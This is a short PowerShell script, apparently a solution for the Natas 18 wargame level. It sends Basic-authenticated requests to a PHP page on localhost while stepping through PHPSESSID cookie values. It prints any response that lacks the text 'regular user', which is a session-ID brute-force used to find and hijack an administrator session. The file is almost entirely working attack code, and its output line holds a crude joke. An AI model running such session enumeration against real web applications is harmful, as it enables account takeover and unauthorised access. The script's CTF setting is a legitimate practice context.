$url = 'http://localhost:8000/index.php?debug&username=&password='
$server = "localhost"

$username = "natas18"
$password = "***REMOVED***"

$pair = "${username}:${password}"
$bytes = [System.Text.Encoding]::ASCII.GetBytes($pair)
$base64 = [System.Convert]::ToBase64String($bytes)
$authorization = "Basic $base64"

$headers = @{
    "Authorization" = $authorization
    "Content-Type"  = "application/x-www-form-urlencoded"
}

$wrongStr = 'regular user'

for ($i = 1; $i -le 1; $i++) {
    write-host "Session: $i"
    $cookieContainer = New-Object System.Net.CookieContainer
    $cookie = New-Object System.Net.Cookie("PHPSESSID", $i, "/", $server)
    $cookieContainer.Add($cookie)
    
    $requestSession = New-Object Microsoft.PowerShell.Commands.WebRequestSession;
    $requestSession.Cookies = $cookieContainer;
    $response = Invoke-WebRequest -Headers $headers -URI $url -WebSession $requestSession;
    write-host $response.content
    if ($response.Content -notlike "*$wrongStr*") {
        write-host "yooooo ur mum: phpSESSID: $i"
    }

}